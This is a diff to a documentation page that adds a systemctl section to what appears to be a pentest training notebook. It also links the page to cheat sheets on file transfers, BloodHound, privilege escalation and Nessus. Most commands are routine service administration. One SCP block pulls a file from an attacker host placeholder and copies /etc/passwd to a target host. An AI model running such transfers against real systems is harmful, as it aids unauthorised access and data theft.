@@ -9,6 +9,32 @@ hideFooterPagination: true
 
 {/* Generated from Commands/systemctl.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## systemctl: choose the operation and read the result
+
+Commands and examples collected from your systemctl notes.
+
+### What the result establishes
+
+Read unit definitions, drop-ins, execution identity and current state before investigating service permissions.
+
+### Prerequisites and common failures
+
+Permission to view or restart a unit differs from permission to modify its executable, configuration or environment.
+
+### Example 1: Setup Steps
+
+Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
+
+```bash
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+sudo rm /etc/nginx/sites-enabled/default          # remove if port 80 conflict
+sudo systemctl restart nginx.service
+```
+
+## Saved commands and notebook recipes
+
+Commands and examples collected from your systemctl notes.
+
 [Search this tool’s saved examples](/commands/notebook?tool=systemctl) · [All tools](/index)
 
 ## Setup Steps
@@ -20,6 +46,13 @@ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
 sudo rm /etc/nginx/sites-enabled/default          # remove if port 80 conflict
 sudo systemctl restart nginx.service
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Setup Steps](/post-exploitation/file-transfers-cheat-sheet#setup-steps)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Saved as written; may include lab values or terminal output.
 
@@ -45,6 +78,13 @@ sudo docker-compose -f ~/bh.compose.yml up -d
 sudo docker-compose -f ~/bh.compose.yml logs | grep -i "Initial Password"   # one-time admin pw
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — CE (BloodHound Community Edition, Docker) — current/recommended](/cheatsheets/bloodhound-complete-guide#ce-bloodhound-community-edition-docker-—-current/recommended)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="SCP (SSH-based Transfer)">
@@ -64,6 +104,13 @@ scp user@<ATTACKER_IP>:/path/to/file .
 scp /etc/passwd htb-student@<TARGET_IP>:/home/htb-student/
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — SCP (SSH-based Transfer)](/post-exploitation/file-transfers-cheat-sheet#scp-ssh-based-transfer)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Systemd timers">
@@ -81,6 +128,13 @@ Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 d
 
 3 timers listed.
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — Systemd timers](/privesc/linux-privesc-checklist#systemd-timers)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -108,6 +162,13 @@ sudo /opt/nessus/sbin/nessuscli fix --reset
 https://localhost:8834
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Vulnerability Assessment, Nessus, and OpenVAS — Key Commands](/recon/vulnerability-assessment-cheat-sheet#key-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Troubleshooting">
@@ -122,6 +183,25 @@ Context from the notebook: Service does not start Check  sudo systemctl status b
 sudo systemctl status bloodhound postgresql --no-pager
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound — Start, Collect, and Import — Troubleshooting](/tools/bloodhound#troubleshooting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+- [Vulnerability Assessment, Nessus, and OpenVAS](/recon/vulnerability-assessment-cheat-sheet)
+- [BloodHound: Full Reference](/cheatsheets/bloodhound-complete-guide)
+- [Linux Privilege Escalation: Full Checklist](/privesc/linux-privesc-checklist)
+- [BloodHound — Start, Collect, and Import](/tools/bloodhound)
+
+{/* VAULT_RELATED_END */}
